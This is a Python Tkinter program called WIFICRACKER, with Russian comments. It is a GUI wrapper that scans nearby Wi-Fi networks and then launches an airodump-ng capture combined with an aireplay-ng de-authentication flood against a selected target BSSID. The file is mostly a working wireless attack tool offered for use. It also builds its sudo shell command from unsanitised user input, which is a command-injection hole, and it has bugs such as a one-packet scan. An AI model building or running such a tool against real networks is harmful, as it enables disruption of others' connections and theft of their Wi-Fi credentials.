# Импорт необходимых библиотек
import tkinter as tk
from scapy.all import *
import netifaces

# Основной класс приложения
class wificracker(tk.Frame):
    # Конструктор класса, вызывается при создании экземпляра класса
    def __init__(self, master=None):
        # Вызов конструктора родительского класса (tk.Frame)
        super().__init__(master)
        # Установка размеров окна и цвета фона
        self.master.geometry("600x500")
        self.master.configure(bg="#1A1A1D")
        # Создание элементов управления
        self.create_widgets()

    # Функция для создания элементов управления
    def create_widgets(self):
        # Создание заголовка
        self.title = tk.Label(
            self.master,
            text="WIFICRACKER",
            font=("Courier", 30),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=20,
        )
        self.title.grid(row=0, column=0, columnspan=2)

        # Создание инструкций
        self.instructions = tk.Label(
            self.master,
            text="Select the WiFi interface,\nthen click Scan Networks:",
            font=("Courier", 12),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.instructions.grid(row=1, column=0, columnspan=2)

        # Создание метки для выбора интерфейса
        self.interface_label = tk.Label(
            self.master,
            text="WiFi Interface:",
            font=("Courier", 14),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.interface_label.grid(row=2, column=0)

        # Получение списка доступных интерфейсов и создание выпадающего списка
        self.interfaces = netifaces.interfaces()
        self.interface_input = tk.StringVar()
        self.interface_dropdown = tk.OptionMenu(self.master, self.interface_input, *self.interfaces)
        self.interface_dropdown.config(width=40, font=("Courier", 14), fg="#FFFFFF", bg="#2C2C32", borderwidth=2)
        self.interface_dropdown.grid(row=3, column=0, pady=10)

        # Создание кнопки для сканирования сетей
        self.scan_button = tk.Button(
            self.master,
            text="SCAN NETWORKS",
            font=("Courier", 16),
            fg="#1A1A1D",
            bg="#8AFF33",
            activebackground="#FF5733",
            padx=20,
            pady=10,
            command=self.scan_networks, # Вызов функции сканирования при нажатии на кнопку
        )
        self.scan_button.grid(row=4, column=0, pady=10)

        # Создание метки для вывода результатов сканирования
        self.output_label = tk.Label(
            self.master,
            text="Output:",
            font=("Courier", 12),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.output_label.grid(row=5, column=0)

        # Создание текстового поля для вывода результатов сканирования
        self.output = tk.Text(
            self.master,
            height=10,
            width=50,
            fg="#FFFFFF",
            bg="#2C2C32",
            borderwidth=2,
            font=("Courier", 14),
        )
        self.output.grid(row=6, column=0, padx=20)

    # Функция для создания элементов управления на втором шаге
    def create_second_step_widgets(self, networks):
        # Создание инструкций для второго шага
        self.instructions2 = tk.Label(
            self.master,
            text="Select the target network's MAC address, then enter the channel,\nthen click Capture below:",
            font=("Courier", 12),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.instructions2.grid(row=1, column=0, columnspan=2)

        # Создание метки для выбора целевой сети
        self.target_label = tk.Label(
            self.master,
            text="Target Network BSSID:",
            font=("Courier", 14),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.target_label.grid(row=2, column=0)

        # Создание выпадающего списка для выбора целевой сети
        self.target_input = tk.StringVar()
        self.target_dropdown = tk.OptionMenu(self.master, self.target_input, *networks)
        self.target_dropdown.config(width=40, font=("Courier", 14), fg="#FFFFFF", bg="#2C2C32", borderwidth=2)
        self.target_dropdown.grid(row=3, column=0, pady=10)

        # Создание метки для ввода номера канала
        self.channel_label = tk.Label(
            self.master,
            text="WiFi Channel:",
            font=("Courier", 14),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.channel_label.grid(row=4, column=0)

        # Создание поля для ввода номера канала
        self.channel_input = tk.Entry(
            self.master,
            width=40,
            borderwidth=2,
            fg="#FFFFFF",
            bg="#2C2C32",
            font=("Courier", 14),
        )
        self.channel_input.grid(row=5, column=0, pady=10)

        # Метка для ввода пути сохранения файла захвата пакетов
        self.path_label = tk.Label(
            self.master,
            text="Enter a path to save the capture file (include .cap extension):",
            font=("Courier", 14),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.path_label.grid(row=6, column=0)

        # Поле для ввода пути сохранения файла захвата пакетов
        self.path_input = tk.Entry(
            self.master,
            width=40,
            borderwidth=2,
            fg="#FFFFFF",
            bg="#2C2C32",
            font=("Courier", 14),
        )
        self.path_input.grid(row=7, column=0, pady=10)

        # Метка для ввода количества пакетов отключения клиентов
        self.dist_label = tk.Label(
            self.master,
            text="Enter number of de-authentication packets (-0) (default is 0):",
            font=("Courier", 14),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.dist_label.grid(row=8, column=0)

        # Поле для ввода количества пакетов отключения клиентов
        self.dist_input = tk.Entry(
            self.master,
            width=40,
            borderwidth=2,
            fg="#FFFFFF",
            bg="#2C2C32",
            font=("Courier", 14),
        )
        self.dist_input.grid(row=9, column=0, pady=10)

        # Кнопка для запуска захвата пакетов
        self.capture_button = tk.Button(
            self.master,
            text="CAPTURE",
            font=("Courier", 16),
            fg="#1A1A1D",
            bg="#8AFF33",
            activebackground="#FF5733",
            padx=20,
            pady=10,
            command=self.capture, # Вызов функции захвата при нажатии на кнопку
        )
        self.capture_button.grid(row=10, column=0, pady=10)

    # Функция для сканирования сетей
    def scan_networks(self):
        # Получение выбранного интерфейса
        interface = self.interface_input.get()
        networks = []
        ssid_list = []

        # Использование Scapy для получения всех точек доступа и связанных с ними деталей
        sniffed_packets = sniff(iface=interface, timeout=10, count=1)
        for packet in sniffed_packets:
            if packet.haslayer(Dot11Beacon):
                bssid = packet[Dot11].addr2.upper()
                if bssid not in networks:
                    networks.append(bssid)
                    ssid_list.append(packet[Dot11Elt].info.decode())

        # Вывод списка найденных сетей в текстовом поле
        output_text = ""
        for i in range(len(networks)):
            output_text += f"Network {i+1} BSSID: {networks[i]}, SSID: {ssid_list[i]}\n\n"
        self.output.insert(tk.END, output_text)

        # Удаление элементов управления со страницы и создание элементов для второго ш 


        self.instructions.grid_forget()
        self.interface_dropdown.grid_forget()
        self.scan_button.grid_forget()

        self.create_second_step_widgets(networks)

    def capture(self):
        interface = self.interface_input.get()
        bssid = self.target_input.get()
        channel = self.channel_input.get()
        path = self.path_input.get()
        dist = self.dist_input.get() or "0"

        command = f"sudo airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} | sudo aireplay-ng -0 {dist} -a {bssid} {interface}"
        process = Popen(
            ["/bin/bash", "-c", command],
            stdout=PIPE,
            stderr=PIPE,
            shell=False,
        )

        output, error = process.communicate()
        if error:
            self.output.insert(tk.END, f"Error:\n\n{error.decode()}")
        else:
            self.output.insert(tk.END, f"Output:\n\n{output.decode()}")

root = tk.Tk()
root.title("WIFICRACKER")
app = wificracker(master=root)
app.mainloop()

